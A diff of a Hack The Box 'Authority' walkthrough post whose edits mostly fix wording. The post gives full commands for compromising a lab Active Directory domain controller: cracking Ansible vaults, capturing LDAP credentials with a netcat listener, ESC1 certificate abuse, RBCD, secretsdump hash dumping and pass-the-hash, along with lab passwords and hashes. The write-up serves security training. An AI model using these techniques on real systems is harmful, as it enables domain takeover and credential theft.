@@ -11,14 +11,14 @@ tags: Active_directory ADCS ESC1 ldap_redirection smb_enumeration ansible
 
 ## Introduction
 
-Authority was a nice and fairly easy Active directory based machine. Getting user access is done by repeating the enumeration processes making it very important to revisit previously tried enumerations using new accounts. Getting domain admin was pretty straight forward as the name of the box gave a big hint that it would be related to Active Directory Certificate Services. I recommend this machine to anyone who wants to get some practice with basic AD enumeration and ADCS exploitation.
+Authority was a nice and fairly easy Active Directory based machine. Getting user access is done by repeating the enumeration processes, making it very important to revisit previously tried enumerations using new accounts. Getting domain admin was pretty straight forward as the name of the box gave a big hint that it would be related to Active Directory Certificate Services. I recommend this machine to anyone who wants to get some practice with basic AD enumeration and ADCS exploitation.
 
-If you like any of my content it would help a lot if you used my referral link to buy Hack the box/ Academy Subscriptions which you can find on my about page.
+If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.
 
 ## Initial access
 ### Recon
 
-To start our recon off we will start with an Nmap scan of the machine. using the following command
+To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
 ```
 sudo nmap -sS -A -p-  -o nmap  10.10.11.222
 ```
@@ -181,7 +181,7 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Sat Dec  9 08:44:59 2023 -- 1 IP address (1 host up) scanned in 127.28 seconds
 ```
 
-Looking at the Nmap output we can see that it looks like a domain controller which makes me think we might have to do some Active Directory exploitation later down the line. I checked if could access the domain controllers shares or LDAP without any credentials using null sessions but this didn't work. I decided to start looking at the webpages. Port **80** was the default IIS page which didn't contain anything interesting. But the web portal on port **8443** contained a self service password portal.
+Looking at the Nmap output we can see that it looks like a domain controller which makes me think we might have to do some Active Directory exploitation later down the line. I checked if could access the domain controllers shares or LDAP without any credentials by using null sessions, but this didn't work. I decided to start looking at the webpages. Port **80** was the default IIS page which didn't contain anything interesting, but the web portal on port **8443** contained a self service password portal.
 
 
 ![Default webpage](/assets/img/Authority/Authority_01.png)
@@ -190,7 +190,7 @@ When looking at the configuration manager page we would be greated with some aut
 
 ![username leaked](/assets/img/Authority/Authority_02.png)
 
-So knowing from experience IT admins occassionally don't use a password for service accounts as this complicates their setup with credential management. I decided to try and access the shares with an empty password using crackmapexec. This was successful and gave us accesss to a share called Development
+So knowing from experience IT admins occassionally don't use a password for service accounts as this complicates their setup with credential management. I decided to try and access the shares with an empty password using **crackmapexec**. This was successful and gave us access to a share called Development.
 
 ```bash
 crackmapexec smb authority.htb -u 'svc_pwm' -p '' --shares
@@ -198,7 +198,7 @@ crackmapexec smb authority.htb -u 'svc_pwm' -p '' --shares
 ![Shares accessible](/assets/img/Authority/Authority_03.png)
 
 
-Now that we know that this user can access the shares i decided to copy the full contents of this directory using **smbget**. Looking at the files it looks like the configuration files of some Ansible roles.
+Now that we know that this user can access the shares, I decided to copy the full contents of this directory using **smbget**. Looking at the files it looks like the configuration files of some Ansible roles.
 
 ```bash
 smbget -R smb://authority.htb/development -U authority.htb/svc_pwm
@@ -208,7 +208,7 @@ smbget -R smb://authority.htb/development -U authority.htb/svc_pwm
 
 ### Ansible analysis
 
-Looking through this file it gives a lot of hints and info about the machine itself. The files related to **ADCS** in combination with the name Authority make it pretty obvious that the privesc was related to active directory certificate services. When digging further into the files i found some Ansible keyvaults inside the **/Automation/Ansible/PWM/defaults/main.yml** file.
+Looking through this file it gives a lot of hints and info about the machine itself. The files related to **ADCS** in combination with the name Authority make it pretty obvious that the privesc was related to Active Directory Certificate Services. When digging further into the files I found some Ansible key vaults inside the **/Automation/Ansible/PWM/defaults/main.yml** file.
 
 ```yml
 ---
@@ -248,7 +248,7 @@ ldap_admin_password: !vault |
           3764
 ```
 
-Next step is to extract the Ansible keyvault hash out of this. We can do this by putting just the vault value in a file and running **ansible2john** on it
+Next step is to extract the Ansible key vault hash out of this. We can do this by putting just the vault value in a file and running **ansible2john** on it.
 
 File: hash.txt
 ```
@@ -270,7 +270,7 @@ This command results into the following hash:
 ```
 hash.txt:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
 ```
-Now we can repeat this process for all the keyvaults and we'll end up with the following three hashes.
+Now we can repeat this process for all the key vaults and we'll end up with the following three hashes:
 
 ```
 hash.txt:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
@@ -278,7 +278,7 @@ hash.txt:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a10
 hash.txt:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
 ```
 
-When we try to crack these hashes in the format they are now it will crash because the format is not valid. To be able to crack these hashes with hashcat you need to remove the text part infront of **$ansible** so you end up with the following file
+When we try to crack these hashes in the format they are now, it will crash because the format is not valid. To be able to crack these hashes with hashcat you need to remove the text part infront of **$ansible** so you end up with the following file:
 
 ```
 $ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
@@ -286,7 +286,7 @@ $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1d
 $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
 ```
 
-Next we can crack this hashes using the following hascat commands. After a few seconds we can see that the password for both unique hashes was **!@#$%^&\***
+Next we can crack this hashes using the following hashcat commands. After a few seconds we can see that the password for both unique hashes was **!@#$%^&\***
 
 ```bash
 hashcat -m 16900 -O -a 0 -w 4 hashes.txt /usr/share/wordlists/rockyou.txt 
@@ -295,7 +295,7 @@ hashcat -m 16900 -O -a 0 -w 4 hashes.txt /usr/share/wordlists/rockyou.txt
 ![Hashes cracked](/assets/img/Authority/Authority_05.png)
 
 
-So this password was not the password contained in the vaults. this is the password used to encrypt the vaults themselves. To decrypt these values you need to put each hash in its own file and then you can decrypt these with the following command
+So this password was not the password contained in the vaults. This is the password used to encrypt the vaults themselves. To decrypt these values you need to put each hash in its own file and then you can decrypt these with the following command:
 **hash file example** 
 ```
 $ANSIBLE_VAULT;1.1;AES256
@@ -310,7 +310,7 @@ Command
 ansible-vault decrypt hash.txt
 ```
 
-This command then converts the original file to the decrypted value. These three vaults would then turn into the following secrets
+This command then converts the original file to the decrypted value. These three vaults would then turn into the following secrets:
 
 ```
 ldap_admin:DevT3st@123
@@ -318,7 +318,7 @@ pwm_admin:svc_pwm
 pwm_pwd:pWm_@dm!N_!23
 ```
 
-Using these credentials on the shares or ldap connections did not work however when i tried the credentials of pwm_admin i was able to log into the platform
+Using these credentials on the shares or LDAP connections did not work however when I tried the credentials of pwm_admin I was able to log into the platform.
 
 
 ### PWM application lateral movement
@@ -328,17 +328,17 @@ So when logging in using this password we are greated with a configuration manag
 ![Access to manager page](/assets/img/Authority/Authority_06.png)
 
 
-The more interesting page on the web application is the editor page which can be reached through the following url
+The more interesting page on the web application is the editor page which can be reached through the following url:
 
 ```
 https://authority.htb:8443/pwm/private/config/editor
 ```
 
-On this page we can find the configuration of the ldap connection in the submenu: **LDAP -> LDAP Directories -> Default -> Connection**. On this page we could change the ldap url to our own machine. This will make the server connect to our machine whenever we either test connection or someone actually tries to do a password reset.
+On this page we can find the configuration of the LDAP connection in the submenu: **LDAP -> LDAP Directories -> Default -> Connection**. On this page we could change the LDAP url to our own machine. This will make the server connect to our machine whenever we either test connection or someone actually tries to do a password reset.
 
 ![Redirecting LDAP](/assets/img/Authority/Authority_07.png)
 
-next we setup a listener using netcat on our machine. Because ldap is a clear text protocol we will be able to capture the serice accounts password using this method.
+Next we setup a listener using netcat on our machine. Because LDAP is a clear text protocol we will be able to capture the serice accounts password using this method.
 
 ```
 nc -lnvp 389
@@ -348,7 +348,7 @@ Then when we press the test LDAP profile button, a moment later we will get the 
 
 ![Ldap credential](/assets/img/Authority/Authority_08.png)
 
-So using these credentials its possible to log into the machine using evilwinrm.
+So using these credentials its possible to log into the machine using **evilwinrm**.
 
 ```bash
 evil-winrm -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -i authority.htb
@@ -356,7 +356,7 @@ evil-winrm -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -i authority.htb
 
 ## Privilege escalation
 
-So knowing that there is an ADCS service based from the Ansible scripts as well as the name of the machine. my first instinct was to check if there were any vulnreable certificates using certipy
+So knowing that there is an ADCS service based from the Ansible scripts as well as the name of the machine, my first instinct was to check if there were any vulnreable certificates using certipy.
 
 ```bash
 certipy find -username 'svc_ldap@authority.htb' -password 'lDaP_1n_th3_cle4r!' -vulnerable -enabled
@@ -364,8 +364,7 @@ certipy find -username 'svc_ldap@authority.htb' -password 'lDaP_1n_th3_cle4r!' -
 
 ![Ldap credential](/assets/img/Authority/Authority_09.png)
 
-When reviewing the results of the tool we can see the following output showing that there was indeed a vulnerable certificate present
-
+When reviewing the results of the tool we can see that there was indeed a vulnerable certificate present:
 
 ```
 Certificate Authorities
@@ -442,7 +441,7 @@ Certificate Templates
       ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
 ```
 
-We can see that all domain computers able to enroll to the **CorpVPN** certificate template. This can be abused to create a certificate impersonating any user. only issue at this point is that its only valid for domain computers and we don't have a domain computer account yet. Well by default low privilege users are allowed to enroll up to 10 machines into the active directory creating a computer account. We can do this using the following command using impacket. For ease of use i'm going to be re-using the password found earlier.
+We can see that all domain computers able to enroll to the **CorpVPN** certificate template. This can be abused to create a certificate impersonating any user. The only issue at this point is that it's only valid for domain computers and we don't have a domain computer account yet. Well by default low privilege users are allowed to enroll up to 10 machines into the active directory creating a computer account. We can do this using the following command using impacket. For ease of use I'm going to be re-using the password found earlier.
 
 ```bash
 impacket-addcomputer -computer-name 'Calico$' -computer-pass 'lDaP_1n_th3_cle4r!' -dc-host 10.10.11.222 -domain-netbios 'authority.htb' 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
@@ -450,7 +449,7 @@ impacket-addcomputer -computer-name 'Calico$' -computer-pass 'lDaP_1n_th3_cle4r!
 ![Computer account made](/assets/img/Authority/Authority_10.png)
 
 
-Alright we have our computer account next step is to request our certificate impersonating the default domain administrator account
+Alright we have our computer account next step is to request our certificate impersonating the default domain administrator account.
 
 ```bash
 certipy req -username 'Calico$@authority.htb' -password 'lDaP_1n_th3_cle4r!' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn Administrator@authority.htb  -debug
@@ -459,13 +458,13 @@ certipy req -username 'Calico$@authority.htb' -password 'lDaP_1n_th3_cle4r!' -ca
 ![Certificate requested](/assets/img/Authority/Authority_11.png)
 
 
-next up we want to convert our certificate to a pem format. using this pem format we can then use it in combination with the [bloody-ad](https://github.com/CravateRouge/bloodyAD) to add the resource based constrained delegation to our previously created machine account. We do thi sso we can get a Ticket granting ticket for our machine account that has the ability to impersonate any account.
+Next up we want to convert our certificate to a PEM format. Using this PEM format we can then use it in combination with [bloody-ad](https://github.com/CravateRouge/bloodyAD) to add the resource based constrained delegation to our previously created machine account. We do this so we can get a Ticket Granting ticket for our machine account that has the ability to impersonate any account.
 
 ```bash
 openssl pkcs12 -in administrator.pfx -out /tmp/cert.pem -nodes
 ```
 
-Now that we have the certificate in pem format we can use bloody-ad to add the resource based constrained delegation to our **Calico$** machine account
+Now that we have the certificate in PEM format we can use bloody-ad to add the resource based constrained delegation to our **Calico$** machine account.
 
 ```
 python bloodyAD.py -d authority.htb  -c ":/tmp/cert.pem" -u 'Calico$' -s  --host 10.10.11.222 add rbcd 'AUTHORITY$' 'CALICO$'
@@ -473,30 +472,30 @@ python bloodyAD.py -d authority.htb  -c ":/tmp/cert.pem" -u 'Calico$' -s  --ho
 ![Successfully added](/assets/img/Authority/Authority_12.png)
 
 
-So now that we upgraded our account to being allowed to impersonate users on the domain controller the next step is to request a tgt with our machine account. We can do this by using the following impacket command.
+So now that we upgraded our account to being allowed to impersonate users on the domain controller, the next step is to request a tgt with our machine account. We can do this by using the following impacket command.
 
 ```bash
 impacket-getST -spn ldap/authority.authority.htb -impersonate administrator -dc-ip 10.10.11.222 'authority.htb/CALICO$:lDaP_1n_th3_cle4r!'
 ```
 
-If you get an error **Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)**: This is because Kerberos is a very sensitive protocol when it comes to timing. our machine and the target need to have the same time. We can fix this by syncing our time to the target machine's.
+If you get an error **Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)**: This is because Kerberos is a very sensitive protocol when it comes to timing. our machine and the target need to have the same time. We can fix this by syncing our time to the target machines.
 
 ```
 sudo ntpdate 10.10.11.222
 ```
 
-After running the impacket command we'd get a valid kerberos ticket
+After running the impacket command we get a valid kerberos ticket:
 
 ![Kerberos Ticket acquired](/assets/img/Authority/Authority_13.png)
 
-next step for ease of use i move the ticket to the tmp directory and set my **KRB5CCNAME** to this file's location. We need to do this to be able to use commands using kerberos authentication.
+For ease of use I moved the ticket to the tmp directory and set my **KRB5CCNAME** to this file's location. We need to do this to be able to use commands using kerberos authentication.
 
 ```bash
 cp administrator.ccache /tmp/
 export KRB5CCNAME=/tmp/administrator.ccache
 ```
 
-So seeing that we have a valid kerberos ticket we can now use this in combination with secrets dump to dump all hashes from the domain controller
+So seeing that we have a valid kerberos ticket, we can now use this in combination with secrets dump to dump all hashes from the domain controller.
 
 ```bash
 impacket-secretsdump  'authority.htb/administrator@authority.authority.htb' -k -no-pass -dc-ip 10.10.11.222 -target-ip 10.10.11.222
@@ -551,7 +550,7 @@ AUTHORITY$:des-cbc-md5:e9da6775751a94b0
 ```
 
 
-Now that we dumped the hashes of both the local accounts we are able to log into the machine using the NT hash in combination with evil-winrm. In this case i used the NT hash of the domain administrator user.
+Now that we dumped the hashes of both the local accounts we are able to log into the machine using the NT hash in combination with evil-winrm. In this case I used the NT hash of the domain administrator user.
 
 ```bash
 evil-winrm -i 10.10.11.222 -u Administrator -H de1afe0f24c54d8f8688ab8aa59cd587
